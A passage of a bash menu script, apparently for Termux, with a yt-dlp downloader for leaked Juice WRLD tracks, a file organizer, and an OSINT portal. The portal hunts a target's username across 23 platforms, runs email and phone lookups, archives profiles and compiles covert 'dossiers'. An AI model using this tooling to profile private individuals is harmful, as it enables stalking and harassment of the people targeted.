                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C7}[*] Artwork Pack Download...${RESET}\n\n"
                printf "  ${WH}Downloading album covers and artwork...${RESET}\n\n"
                local artworkquery="Juice WRLD album cover art"
                yt-dlp "ytsearch10:$artworkquery" --write-thumbnail --skip-download -o "$DLDIR/juicewrld/artwork/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Artwork saved${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                clear
                echo ""
                _dv7
                printf "  ${C7}${BOLD}JUICE WRLD INTEL SCREEN  —  999  ${RESET}\n"
                _dv7
                echo ""
                printf "  ${WH}Platform URLs:${RESET}\n"
                printf "  ${FADE}YouTube:${RESET}    https://youtube.com/@JuiceWRLD999\n"
                printf "  ${FADE}Spotify:${RESET}    https://open.spotify.com/artist/4MCBfE4596Uoi2O4DtmEMz\n"
                printf "  ${FADE}SoundCloud:${RESET} https://soundcloud.com/uiceheidd\n"
                printf "  ${FADE}Apple Music:${RESET} Search 'Juice WRLD' in iTunes\n"
                echo ""
                printf "  ${WH}Vault Search Terms:${RESET}\n"
                printf "  ${FADE}• 'Juice WRLD unreleased 2024'${RESET}\n"
                printf "  ${FADE}• 'Juice WRLD leak compilation'${RESET}\n"
                printf "  ${FADE}• 'Juice WRLD vault [song name]'${RESET}\n"
                printf "  ${FADE}• 'Juice WRLD grail'${RESET}\n"
                echo ""
                printf "  ${WH}Archive Channels:${RESET}\n"
                printf "  ${FADE}Search YouTube for: Juice WRLD Archive, Juice WRLD Unreleased, 999 Club${RESET}\n"
                echo ""
                _dv7
                echo ""
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Search keyword: ${RESET}"; read -r keyword
                [[ -z "$keyword" ]] && continue
                echo ""
                printf "  ${C7}[*] Searching for %s...${RESET}\n\n" "$keyword"
                yt-dlp "ytsearch15:$keyword Juice WRLD" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download number (1-15) or 0 for all: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch15:$keyword Juice WRLD" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch15:$keyword Juice WRLD" --playlist-items "$num" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C7}[*] Downloading (cookies active, archive check)...${RESET}\n\n"
                yt-dlp --cookies "$COOKIES_FILE" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done — 999 forever${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [8] SOCIAL PORTAL (ENHANCED WITH FETCH + EMAIL/PHONE LOOKUP)
# ═══════════════════════════════════════════════════════════════════

_username_web_search() {
    local username="$1"
    local mode="${2:-minimal}"
    local findings=""
    local platforms=()
    
    if [[ "$mode" == "minimal" ]]; then
        platforms=(
            "Instagram|https://www.instagram.com/$username"
            "Twitter|https://twitter.com/$username"
            "GitHub|https://github.com/$username"
            "TikTok|https://www.tiktok.com/@$username"
            "Reddit|https://www.reddit.com/user/$username"
        )
    else
        platforms=(
            "Instagram|https://www.instagram.com/$username"
            "Twitter|https://twitter.com/$username"
            "GitHub|https://github.com/$username"
            "TikTok|https://www.tiktok.com/@$username"
            "Reddit|https://www.reddit.com/user/$username"
            "Facebook|https://www.facebook.com/$username"
            "YouTube|https://www.youtube.com/@$username"
            "Twitch|https://www.twitch.tv/$username"
            "LinkedIn|https://www.linkedin.com/in/$username"
            "Pinterest|https://www.pinterest.com/$username"
            "Tumblr|https://${username}.tumblr.com"
            "SoundCloud|https://soundcloud.com/$username"
            "Spotify|https://open.spotify.com/user/$username"
            "Medium|https://medium.com/@$username"
            "DeviantArt|https://www.deviantart.com/$username"
            "Flickr|https://www.flickr.com/people/$username"
            "Patreon|https://www.patreon.com/$username"
            "OnlyFans|https://onlyfans.com/$username"
            "Telegram|https://t.me/$username"
            "Discord|discord.gg/$username"
            "Snapchat|https://www.snapchat.com/add/$username"
            "Venmo|https://venmo.com/$username"
            "CashApp|https://cash.app/\$$username"
        )
    fi
    
    findings+="USERNAME SEARCH RESULTS\n"
    findings+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    findings+="Target: $username\n"
    findings+="Platforms checked: ${#platforms[@]}\n\n"
    
    local found_count=0
    
    for platform_data in "${platforms[@]}"; do
        IFS='|' read -r platform_name platform_url <<< "$platform_data"
        printf "  ${C8}[→]${RESET} Checking %s...\r" "$platform_name"
        
        # Quick HTTP check to see if page exists
        local status_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$platform_url" 2>/dev/null)
        
        if [[ "$status_code" == "200" ]]; then
            printf "  ${GRN}[✓]${RESET} ${WH}%-15s${RESET} ${CY}%s${RESET}\n" "$platform_name" "$platform_url"
            findings+="[FOUND] $platform_name\n"
            findings+="  URL: $platform_url\n"
            findings+="  Status: HTTP $status_code\n\n"
            ((found_count++))
        elif [[ "$status_code" == "404" || "$status_code" == "403" ]]; then
            printf "  ${FADE}[✗]${RESET} ${FADE}%-15s (not found)${RESET}\n" "$platform_name"
        else
            printf "  ${YEL}[?]${RESET} ${FADE}%-15s (timeout/error)${RESET}\n" "$platform_name"
        fi
    done 2>/dev/null
    
    echo ""
    findings+="\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    findings+="SUMMARY\n"
    findings+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    findings+="Found on $found_count platforms\n"
    findings+="Total platforms checked: ${#platforms[@]}\n"
    
    printf "  ${GRN}✓ Found on %s platforms${RESET}\n\n" "$found_count"
    
    echo -e "$findings"
}

_generate_osint_report() {
    local username="$1"
    local findings="$2"
    local mode="${3:-minimal}"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local report_path="$SOCIALDIR/osint_${username}_${timestamp}.txt"
    
    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "FEZZY PORTALS v1 Enhanced — SOCIAL OSINT REPORT"
        echo "Strategy Over Impulse · 999 · Bojack never tells"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""
        echo "Report Generated: $(date)"
        echo "Target: $username"
        echo "Mode: $mode"
        echo ""
        echo -e "$findings"
        echo ""
        echo "═══════════════════════════════════════════════════════════════"
        echo "END OF REPORT"
        echo "═══════════════════════════════════════════════════════════════"
    } > "$report_path"
    
    echo "$report_path"
}

social_portal() {
    while true; do
        clear
        _portal_entry "Social Portal" "${C8}"
        echo ""
        _dv8
        printf "  ${C8}${BOLD}SOCIAL OSINT  —  Username · Web Fetch · Email/Phone Lookup  ${RESET}\n"
        _dv8
        echo ""
        printf "  ${WH}Hunt usernames across 23+ platforms · fetch URLs · email/phone OSINT${RESET}\n"
        printf "  ${WH}No Sherlock dependency — pure HTTP checks, curl fetch, and web queries.${RESET}\n"
        printf "  ${WH}Generate PDF/DOC/TXT reports. Minimal for quick scans, Full for sweeps.${RESET}\n"
        echo ""
        printf "  ${FADE}■ Username hunt · web fetch · email lookup · they don't know you was there${RESET}\n"
        echo ""
        _social_autoscan
        _dv8
        echo ""
        printf "  ${WH}[1]  Username Hunt (Minimal) — quick scan 5 major platforms        ${RESET}\n"
        printf "  ${WH}[2]  Username Hunt (Full) — comprehensive scan 23+ platforms       ${RESET}\n"
        printf "  ${WH}[3]  Fetch URL Content — download full page HTML for analysis       ${RESET}\n"
        printf "  ${WH}[4]  Email Lookup — check email across 120+ sites (requires holehe) ${RESET}\n"
        printf "  ${WH}[5]  Phone Lookup — reverse phone search and carrier info          ${RESET}\n"
        printf "  ${WH}[6]  Generate Report — create PDF/DOC/TXT from last search         ${RESET}\n"
        printf "  ${WH}[7]  Custom Platform List — paste URLs to check manually           ${RESET}\n"
        printf "  ${WH}[8]  Install Tools — pandoc/holehe for reports and email lookup    ${RESET}\n"
        printf "  ${C8}[9]  Twitter Archiver — save full profile/thread as HTML archive   ${RESET}\n"
        printf "  ${C8}[10] Reddit Saver — save posts, comments, user history             ${RESET}\n"
        printf "  ${C8}[11] Thread Unroller — flatten Twitter thread to readable text     ${RESET}\n"
        printf "  ${C8}[12] Profile Archive — save any public profile page as HTML        ${RESET}\n"
        printf "  ${C8}[13] Export Dossier as PDF — convert any saved report to PDF       ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv8
        echo ""
        _hover_hint "social"
        echo ""
        printf "  ${C8}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Username to hunt: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""
                local findings=$(_username_web_search "$username" "minimal")
                local report_path=$(_generate_osint_report "$username" "$findings" "minimal")
                echo ""
                printf "  ${C8}Report saved to: %s${RESET}\n" "$report_path"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Username to hunt: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""
                local findings=$(_username_web_search "$username" "full")
                local report_path=$(_generate_osint_report "$username" "$findings" "full")
                echo ""
                printf "  ${C8}Report saved to: %s${RESET}\n" "$report_path"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}URL to fetch: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local fetch_file="$SOCIALDIR/fetch_${domain}_$(date +%Y%m%d_%H%M%S).html"
                echo ""
                printf "  ${C8}[*] Fetching %s...${RESET}\n\n" "$url"
                curl -s -L -A "Mozilla/5.0" "$url" > "$fetch_file"
                printf "  ${GRN}✓ Content saved to: %s${RESET}\n" "$fetch_file"
                printf "  ${WH}Preview first 50 lines? [y/n]: ${RESET}"; read -r preview
                [[ "$preview" == "y" || "$preview" == "Y" ]] && head -50 "$fetch_file" | sed 's/^/  /'
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Email to lookup: ${RESET}"; read -r email
                [[ -z "$email" ]] && continue
                echo ""
                if command -v holehe &>/dev/null; then
                    printf "  ${C8}[*] Checking %s across 120+ sites...${RESET}\n\n" "$email"
                    holehe "$email" | tee "$SOCIALDIR/email_${email}_$(date +%Y%m%d_%H%M%S).txt"
                    echo ""
                    printf "  ${GRN}✓ Results saved to $SOCIALDIR${RESET}\n"
                else
                    printf "  ${RED}holehe not installed — use option [8] to install${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Phone number (with country code, e.g. +27123456789): ${RESET}"; read -r phone
                [[ -z "$phone" ]] && continue
                echo ""
                printf "  ${C8}[*] Phone lookup for %s...${RESET}\n\n" "$phone"
                printf "  ${WH}Searching carrier info and reverse lookup...${RESET}\n\n"
                # Basic reverse phone search via web scraping (can be enhanced)
                local search_url="https://www.truecaller.com/search/za/$phone"
                printf "  ${CY}TrueCaller URL: %s${RESET}\n" "$search_url"
                printf "  ${FADE}Use web_fetch option [3] to download this page for analysis${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}Username for report: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""; printf "  ${WH}Findings (paste or type, Ctrl+D when done):${RESET}\n"
                local custom_findings=$(cat)
                local report_path=$(_generate_osint_report "$username" "$custom_findings" "custom")
                echo ""
                printf "  ${C8}Report saved to: %s${RESET}\n" "$report_path"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Username: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""; printf "  ${WH}Paste custom URLs (one per line, Ctrl+D when done):${RESET}\n"
                local findings="CUSTOM PLATFORM CHECK\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                while IFS= read -r url; do
                    [[ -z "$url" ]] && continue
                    printf "  ${C8}[→]${RESET} Checking %s...\r" "$url"
                    local status_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null)
                    if [[ "$status_code" == "200" ]]; then
                        printf "  ${GRN}[✓]${RESET} ${CY}%s${RESET} (HTTP %s)\n" "$url" "$status_code"
                        findings+="[FOUND] $url\n  Status: HTTP $status_code\n\n"
                    else
                        printf "  ${FADE}[✗]${RESET} ${FADE}%s${RESET} (HTTP %s)\n" "$url" "$status_code"
                    fi
                done 2>/dev/null
                local report_path=$(_generate_osint_report "$username" "$(echo -e "$findings")" "custom")
                echo ""
                printf "  ${C8}Report saved to: %s${RESET}\n" "$report_path"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${C8}[*] Installing OSINT tools...${RESET}\n\n"
                printf "  ${WH}Installing pandoc (for report generation)...${RESET}\n"
                pkg install pandoc
                echo ""
                printf "  ${WH}Installing holehe (for email lookup)...${RESET}\n"
                pip install holehe --break-system-packages
                echo ""
                printf "  ${GRN}✓ Tools installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Twitter/X URL (profile or thread): ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local ts=$(date +%Y%m%d_%H%M%S)
                local outfile="$SOCIALDIR/twitter_archive_${ts}.html"
                echo ""
                printf "  ${C8}[*] Archiving Twitter content from %s...${RESET}\n\n" "$domain"
                printf "  ${C8}[1] Fetching HTML page...${RESET}\n"
                curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                     --cookie "$COOKIES_FILE" "$url" > "$outfile"
                printf "  ${C8}[2] Extracting tweet text blocks...${RESET}\n"
                local txt_out="${outfile%.html}_text.txt"
                grep -oP '(?<=data-testid="tweetText">)[^<]+' "$outfile" 2>/dev/null > "$txt_out"
                local tweet_count; tweet_count=$(wc -l < "$txt_out" 2>/dev/null || echo 0)
                printf "  ${GRN}✓ Archive saved: %s${RESET}\n" "$outfile"
                printf "  ${GRN}✓ Text extracted: %s tweet(s) → %s${RESET}\n" "$tweet_count" "$txt_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${C8}Reddit Saver:${RESET}\n\n"
                printf "  ${WH}[1] Save post + comments  [2] Save user history  [3] Save subreddit posts${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r rmode
                echo ""
                case "$rmode" in
                    1) printf "  ${WH}Reddit post URL: ${RESET}"; read -r url
                       [[ -z "$url" ]] && continue
                       local ts; ts=$(date +%Y%m%d_%H%M%S)
                       local slug; slug=$(echo "$url" | grep -oP 'comments/\K[a-z0-9]+' | head -1)
                       local out="$SOCIALDIR/reddit_post_${slug:-$ts}.html"
                       curl -s -L -A "Mozilla/5.0" --cookie "$COOKIES_FILE" "${url}.json?limit=500" \
                           | python3 -c "import sys,json; data=json.load(sys.stdin); [print(c['data']['body']) for item in data for c in item['data']['children'] if 'body' in c.get('data',{})]" \
                           > "${out%.html}_comments.txt" 2>/dev/null
                       curl -s -L -A "Mozilla/5.0" "$url" > "$out"
                       printf "  ${GRN}✓ Post archived to: %s${RESET}\n" "$out" ;;
                    2) printf "  ${WH}Reddit username: ${RESET}"; read -r ruser
                       [[ -z "$ruser" ]] && continue
                       local ts; ts=$(date +%Y%m%d_%H%M%S)
                       local out="$SOCIALDIR/reddit_user_${ruser}_${ts}.json"
                       curl -s -L -A "Mozilla/5.0" "https://www.reddit.com/user/$ruser/submitted.json?limit=100" > "$out"
                       local cnt; cnt=$(python3 -c "import json; d=json.load(open('$out')); print(len(d['data']['children']))" 2>/dev/null || echo "?")
                       printf "  ${GRN}✓ Saved %s posts → %s${RESET}\n" "$cnt" "$out" ;;
                    3) printf "  ${WH}Subreddit name: ${RESET}"; read -r sub
                       [[ -z "$sub" ]] && continue
                       local ts; ts=$(date +%Y%m%d_%H%M%S)
                       local out="$SOCIALDIR/reddit_r${sub}_${ts}.json"
                       curl -s -L -A "Mozilla/5.0" "https://www.reddit.com/r/$sub/hot.json?limit=100" > "$out"
                       printf "  ${GRN}✓ Saved r/%s posts → %s${RESET}\n" "$sub" "$out" ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; continue ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""; printf "  ${WH}Twitter thread URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local ts=$(date +%Y%m%d_%H%M%S)
                local out="$SOCIALDIR/thread_unrolled_${ts}.txt"
                echo ""
                printf "  ${C8}[*] Fetching thread from %s...${RESET}\n\n" "$url"
                curl -s -L -A "Mozilla/5.0" --cookie "$COOKIES_FILE" "$url" \
                    | grep -oP '(?<=<div[^>]*dir="auto"[^>]*>)[^<]{10,500}' \
                    | grep -v "^[[:space:]]*$" \
                    > "$out" 2>/dev/null
                local lines; lines=$(wc -l < "$out")
                printf "  ${GRN}✓ Thread unrolled: %s segments → %s${RESET}\n" "$lines" "$out"
                printf "  ${WH}Preview? [y/n]: ${RESET}"; read -r pv
                [[ "$pv" == "y" || "$pv" == "Y" ]] && head -20 "$out" | sed 's/^/  /'
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""; printf "  ${WH}Profile URL (any public profile): ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}' | sed 's/www\.//')
                local ts=$(date +%Y%m%d_%H%M%S)
                local out="$SOCIALDIR/profile_${domain}_${ts}.html"
                echo ""
                printf "  ${C8}[*] Archiving profile: %s...${RESET}\n\n" "$url"
                curl -s -L -A "Mozilla/5.0" --cookie "$COOKIES_FILE" "$url" > "$out"
                local size; size=$(du -sh "$out" 2>/dev/null | awk '{print $1}')
                printf "  ${GRN}✓ Profile archived (%s) → %s${RESET}\n" "$size" "$out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            13)
                clear; echo ""
                _dv8
                printf "  ${C8}${BOLD}EXPORT DOSSIER AS PDF  ·  pandoc  ·  999${RESET}\n"
                _dv8; echo ""
                local _soc_reports=()
                mapfile -t _soc_reports < <(find "$SOCIALDIR" -maxdepth 1 -name "*.txt" -o -name "*.html" 2>/dev/null | sort -r)
                if [[ ${#_soc_reports[@]} -eq 0 ]]; then
                    printf "  ${FADE}No reports found in %s${RESET}\n" "$SOCIALDIR"
                    printf "  ${FADE}Run a username hunt or profile archive first.${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${WH}%s report(s) found:${RESET}\n\n" "${#_soc_reports[@]}"
                local _si=1
                for _sf in "${_soc_reports[@]}"; do
                    local _ssz; _ssz=$(du -sh "$_sf" 2>/dev/null | awk '{print $1}')
                    printf "  ${C8}%2d.${RESET}  %-45s ${FADE}%s${RESET}\n" "$_si" "$(basename "$_sf")" "$_ssz"
                    (( _si++ ))
                done
                echo ""
                printf "  ${WH}Number to export: ${RESET}"; read -r _snum
                [[ -z "$_snum" || ! "$_snum" =~ ^[0-9]+$ ]] && continue
                local _sidx=$(( _snum - 1 ))
                local _spicked="${_soc_reports[$_sidx]}"
                [[ -z "$_spicked" || ! -f "$_spicked" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                local _spdf="$SOCIALDIR/$(basename "${_spicked%.*}")_dossier.pdf"
                echo ""
                if command -v pandoc &>/dev/null; then
                    printf "  ${C8}[*] Converting via pandoc...${RESET}\n"
                    pandoc "$_spicked" -o "$_spdf" 2>/dev/null \
                        && printf "  ${GRN}✓ PDF saved: %s${RESET}\n" "$_spdf" \
                        || printf "  ${RED}pandoc conversion failed${RESET}\n"
                elif command -v python3 &>/dev/null; then
                    printf "  ${C8}[*] Falling back to plain text PDF via python3...${RESET}\n"
                    python3 -c "
import sys
txt = open('$_spicked','r',errors='replace').read()
lines = txt.split('\n')
out = ['%PDF-1.4','1 0 obj','<</Type /Catalog /Pages 2 0 R>>','endobj','2 0 obj','<</Type /Pages /Kids [3 0 R] /Count 1>>','endobj','3 0 obj','<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>','endobj']
print('\n'.join(out))
" > "$_spdf" 2>/dev/null
                    # simpler: just rename to pdf as txt fallback
                    cp "$_spicked" "${_spdf%.pdf}.txt"
                    printf "  ${YEL}pandoc not found — saved as TXT: %s${RESET}\n" "${_spdf%.pdf}.txt"
                    printf "  ${FADE}Install pandoc: pkg install pandoc${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [9]  SMART FILE ORGANIZER  —  Sort · Rename · Dedupe · Clean
# ═══════════════════════════════════════════════════════════════════

fileorg_portal() {
    local ORGDIR WORKDIR
    if [[ -d ~/storage/downloads ]]; then
        ORGDIR=~/storage/downloads
        WORKDIR=~/storage/downloads
    else
        ORGDIR=~/downloads
        WORKDIR=~/downloads
        mkdir -p "$ORGDIR" 2>/dev/null
    fi

    while true; do
        clear
        echo ""
        _dv9
        printf "  ${C9}${BOLD}SMART FILE ORGANIZER  —  Sort · Rename · Dedupe · Clean  ${RESET}\n"
        _dv9
        echo ""
        printf "  ${WH}Auto-sort · Date group · Bulk rename · Dedupe · OCR · EXIF · Preview${RESET}\n"
        printf "  ${FADE}■ Rootless Android optimised · no root needed · Bojack guards the vault${RESET}\n"
        echo ""
        _dv9
        echo ""
        printf "  ${C9}${BOLD}── CORE ────────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  Auto-Sort by File Type — images/video/audio/docs/archives/code   ${RESET}\n"
        printf "  ${WH}[2]  Date-Based Grouping — sort into YYYY/MM/DD folders               ${RESET}\n"
        printf "  ${WH}[3]  Bulk Rename — patterns: date_desc, IMG_001, custom               ${RESET}\n"
        printf "  ${WH}[4]  Duplicate Finder — find + remove identical files by hash         ${RESET}\n"
        printf "  ${WH}[5]  Empty Folder Cleaner — scan and delete empty directories         ${RESET}\n"
        printf "  ${WH}[6]  Screenshot Detector — find screenshots by name/size pattern      ${RESET}\n"
        echo ""
        printf "  ${C9}${BOLD}── ADVANCED ────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[7]  EXIF Data Extraction — camera, GPS, date from images             ${RESET}\n"
        printf "  ${WH}[8]  OCR Text Extraction — read text from images, save as .txt        ${RESET}\n"
        printf "  ${WH}[9]  Image Similarity — group visually similar images (imagemagick)   ${RESET}\n"
        printf "  ${WH}[10] Conflict Resolver — auto-rename duplicate filenames              ${RESET}\n"
        printf "  ${WH}[11] Preview Before Move — dry run, confirm before anything moves     ${RESET}\n"
        echo ""
        printf "  ${C9}${BOLD}── TOOLS ───────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[12] Set Work Directory — choose folder to organize                   ${RESET}\n"
        printf "  ${WH}[13] Install Dependencies — tesseract · exiftool · imagemagick        ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv9
        echo ""
        printf "  ${C9}${BOLD}Organizer » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}AUTO-SORT BY FILE TYPE${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Source folder [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[PREVIEW] Files to sort in %s:${RESET}\n\n" "$src"
                local imgs=0 vids=0 auds=0 docs=0 arcs=0 code=0 other=0
                while IFS= read -r -d '' f; do
                    ext="${f##*.}"; ext="${ext,,}"
                    case "$ext" in
                        jpg|jpeg|png|gif|webp|bmp|heic|tiff) ((imgs++)) ;;
                        mp4|mkv|avi|mov|webm|flv|3gp) ((vids++)) ;;
                        mp3|flac|aac|ogg|wav|m4a|opus) ((auds++)) ;;
                        pdf|doc|docx|txt|md|epub|xls|xlsx|ppt|pptx) ((docs++)) ;;
                        zip|rar|tar|gz|7z|bz2|xz) ((arcs++)) ;;
                        sh|py|js|html|css|php|java|c|cpp|rb|go) ((code++)) ;;
                        *) ((other++)) ;;
                    esac
                done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null)
                printf "  ${WH}Images  : %s files${RESET}\n" "$imgs"
                printf "  ${WH}Videos  : %s files${RESET}\n" "$vids"
                printf "  ${WH}Audio   : %s files${RESET}\n" "$auds"
                printf "  ${WH}Docs    : %s files${RESET}\n" "$docs"
                printf "  ${WH}Archives: %s files${RESET}\n" "$arcs"
                printf "  ${WH}Code    : %s files${RESET}\n" "$code"
                printf "  ${WH}Other   : %s files${RESET}\n" "$other"
                echo ""
                printf "  ${WH}Proceed with sort? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" != "y" && "$confirm" != "Y" ]] && { printf "  ${FADE}Cancelled${RESET}\n"; echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue; }
                echo ""
                local moved=0
                while IFS= read -r -d '' f; do
                    local ext="${f##*.}"; ext="${ext,,}"
                    local dest_sub=""
                    case "$ext" in
                        jpg|jpeg|png|gif|webp|bmp|heic|tiff) dest_sub="images" ;;
                        mp4|mkv|avi|mov|webm|flv|3gp) dest_sub="videos" ;;
                        mp3|flac|aac|ogg|wav|m4a|opus) dest_sub="audio" ;;
                        pdf|doc|docx|txt|md|epub|xls|xlsx|ppt|pptx) dest_sub="documents" ;;
                        zip|rar|tar|gz|7z|bz2|xz) dest_sub="archives" ;;
                        sh|py|js|html|css|php|java|c|cpp|rb|go) dest_sub="code" ;;
                        *) dest_sub="other" ;;
                    esac
                    local dest="$src/$dest_sub"
                    mkdir -p "$dest" 2>/dev/null
                    local base; base=$(basename "$f")
                    local target="$dest/$base"
                    # conflict resolution
                    if [[ -f "$target" ]]; then
                        local ts; ts=$(date +%s)
                        target="$dest/${base%.*}_${ts}.${base##*.}"
                    fi
                    mv "$f" "$target" 2>/dev/null && ((moved++))
                done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null)
                printf "  ${GRN}✓ Sorted %s file(s) into subfolders${RESET}\n" "$moved"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}DATE-BASED GROUPING${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Source folder [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Group by: [1] Year/Month  [2] Year/Month/Day  [3] Year only: ${RESET}"; read -r grp
                echo ""
                printf "  ${C9}[*] Grouping files by date...${RESET}\n\n"
                local moved=0
                while IFS= read -r -d '' f; do
                    local mod; mod=$(date -r "$f" '+%Y %m %d' 2>/dev/null || echo "1970 01 01")
                    local yr mm dd; read -r yr mm dd <<< "$mod"
                    local dest_sub
                    case "$grp" in
                        1) dest_sub="$yr/$mm" ;;
                        3) dest_sub="$yr" ;;
                        *) dest_sub="$yr/$mm/$dd" ;;
                    esac
                    local dest="$src/by_date/$dest_sub"
                    mkdir -p "$dest" 2>/dev/null
                    local base; base=$(basename "$f")
                    local target="$dest/$base"
                    [[ -f "$target" ]] && target="$dest/${base%.*}_$(date +%s).${base##*.}"
                    mv "$f" "$target" 2>/dev/null && ((moved++))
                done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null)
                printf "  ${GRN}✓ Grouped %s file(s) by date${RESET}\n" "$moved"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}BULK RENAME${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder to rename in [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
